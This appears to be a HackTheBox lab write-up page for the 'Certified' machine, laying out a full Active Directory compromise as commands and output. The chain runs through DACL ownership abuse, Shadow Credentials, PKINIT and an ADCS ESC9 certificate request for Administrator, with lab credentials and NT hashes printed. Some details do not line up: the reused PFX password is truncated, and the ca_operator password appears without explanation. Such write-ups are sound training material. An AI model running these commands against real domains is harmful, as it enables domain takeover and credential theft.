@@ -1,0 +1,269 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Certified</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+
+<h1>Certified (HTB – Medium)</h1>
+
+<p>
+This machine is an Active Directory environment with multiple misconfigurations: weak user credentials,
+DACL abuse (WriteOwner → WriteMembers), Shadow Credentials, and an ADCS ESC9 vulnerability. The final
+compromise is achieved by requesting a certificate with Administrator UPN and extracting the NT hash.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: 10.10.11.41  
+<br>Initial access: judith.mader / judith09  
+<br>Domain: certified.htb  
+<br>Techniques: DACL abuse, targeted Kerberoast, Shadow Credentials, PKINIT, ADCS ESC9  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>NetExec:</p>
+<pre>
+$ nxc smb 10.10.11.41 -u "judith.mader" -p 'judith09' --rid-brute
+$ nxc ldap 10.10.11.41 -u judith.mader -p 'judith09' --users
+Users:
+Administrator
+Guest
+krbtgt
+judith.mader
+management_svc
+ca_operator
+alexander.huges
+harry.wilson
+gregory.cameron
+</pre>
+
+<p>BloodHound collection:</p>
+<pre>
+$ nxc ldap 10.10.11.41 -u judith.mader -p 'judith09' --bloodhound --collection ALL --dns-server 10.10.11.41
+-> bloodhound.zip
+</pre>
+
+<p>enum4linux-ng:</p>
+<pre>
+NetBIOS: DC01
+Domain: CERTIFIED
+DNS: certified.htb
+</pre>
+
+<h2>BloodHound Analysis</h2>
+
+<p>
+BloodHound shows:
+</p>
+
+<pre>
+judith.mader -> WriteOwner -> MANAGEMENT (Group)
+</pre>
+
+<p>Take ownership of the group:</p>
+<pre>
+$ impacket-owneredit -action write -new-owner 'judith.mader' \
+  -target 'management' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
+</pre>
+
+<p>Grant WriteMembers to yourself:</p>
+<pre>
+$ impacket-dacledit -action write -rights WriteMembers \
+  -principal 'judith.mader' \
+  -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' \
+  'certified.htb'/'judith.mader':'judith09'
+</pre>
+
+<p>Add yourself to the group:</p>
+<pre>
+$ net rpc group addmem "MANAGEMENT" "judith.mader" \
+  -U "certified.htb"/"judith.mader"%"judith09" -S "10.10.11.41"
+</pre>
+
+<p>Group members now:</p>
+<pre>
+CERTIFIED\judith.mader
+CERTIFIED\management_svc
+</pre>
+
+<h2>Targeted Kerberoast Attempt</h2>
+
+<p>
+MANAGEMENT has GenericWrite over <code>management_svc</code>.  
+Attempt Kerberoast:
+</p>
+
+<pre>
+$ sudo ntpdate 10.10.11.41
+$ targetedKerberoast.py -d certified.htb -u judith.mader -p judith09 --dc-ip 10.10.11.41
+-> hash obtained but not crackable
+</pre>
+
+<p>
+Hashcat exhausted the wordlist. No password recovered.
+</p>
+
+<h2>Shadow Credentials (pywhisker)</h2>
+
+<p>Add a KeyCredential to management_svc:</p>
+<pre>
+$ pywhisker.py -d certified.htb -u judith.mader -p judith09 \
+  --target management_svc --action add
+-> Saved PFX: GyQadAKv.pfx
+-> Password: DR4zJqcY6beffcceYXRQ
+</pre>
+
+<h2>PKINIT (TGT + NT Hash)</h2>
+
+<p>Obtain TGT:</p>
+<pre>
+$ gettgtpkinit.py certified.htb/management_svc \
+  -cert-pfx GyQadAKv.pfx -pfx-pass DR4zJqcY6beffcce
+</pre>
+
+<p>Extract NT hash:</p>
+<pre>
+$ getnthash.py certified.htb/management_svc -key <KEY_FROM_OUTPUT>
+-> a091c1832bcdd4677c28b5a6a1295584
+</pre>
+
+<p>
+This hash allows WinRM as <code>management_svc</code>:
+</p>
+
+<pre>
+$ evil-winrm -i 10.10.11.41 -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
+</pre>
+
+<h2>ADCS Enumeration (Certipy)</h2>
+
+<p>Find templates:</p>
+<pre>
+$ certipy-ad find -username ca_operator@certified.htb -password ca_operator -dc-ip 10.10.11.41
+-> ESC9 vulnerability identified
+</pre>
+
+<h2>ESC9 Exploitation</h2>
+
+<p>
+Update <code>ca_operator</code> UPN to Administrator:
+</p>
+
+<pre>
+$ certipy-ad account update \
+  -username management_svc@certified.htb \
+  -hashes a091c1832bcdd4677c28b5a6a1295584 \
+  -user ca_operator -upn Administrator
+</pre>
+
+<p>Request certificate using template <code>CertifiedAuthentication</code>:</p>
+<pre>
+$ certipy-ad req -username ca_operator@certified.htb -p ca_operator \
+  -ca certified-DC01-CA -template CertifiedAuthentication -debug
+-> administrator.pfx
+</pre>
+
+<h2>Administrator Access</h2>
+
+<p>Authenticate with the certificate:</p>
+<pre>
+$ certipy-ad auth -pfx administrator.pfx -domain certified.htb
+-> NT hash: 0d5b49608bbce1751f708748f67e2d34
+</pre>
+
+<p>WinRM as Administrator:</p>
+<pre>
+$ evil-winrm -i 10.10.11.41 -u Administrator -H '0d5b49608bbce1751f708748f67e2d34'
+-> root.txt
+</pre>
+
+<h2>Conclusion</h2>
+<p>
+The machine chains several AD misconfigurations: DACL WriteOwner abuse, WriteMembers privilege escalation,
+Shadow Credentials, PKINIT authentication, and finally ADCS ESC9 to impersonate Administrator.  
+The final certificate request provides a valid Administrator TGT and NT hash, allowing full domain compromise.
+</p>
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
